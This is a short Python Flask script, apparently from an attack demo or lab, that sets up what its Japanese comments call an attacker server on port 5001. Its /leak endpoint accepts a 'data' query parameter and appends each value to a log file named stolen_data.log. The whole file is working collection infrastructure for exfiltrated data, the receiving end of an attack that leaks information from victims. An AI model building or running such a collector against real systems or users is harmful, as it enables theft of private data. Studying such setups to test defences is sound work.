from flask import Flask, request
import datetime

app = Flask(__name__)

# 窃取したデータを保存するログファイル
LOG_FILE = "stolen_data.log"

@app.route('/leak')
def leak():
    data = request.args.get('data', 'no data')
    timestamp = datetime.datetime.now().isoformat()
    log_entry = f"[{timestamp}] Stolen Data: {data}\n"
    
    print(f"!!! DATA LEAKED !!! : {data}")
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
        
    return "OK", 200

if __name__ == "__main__":
    # 攻撃者サーバーをポート 5001 で起動
    app.run(port=5001)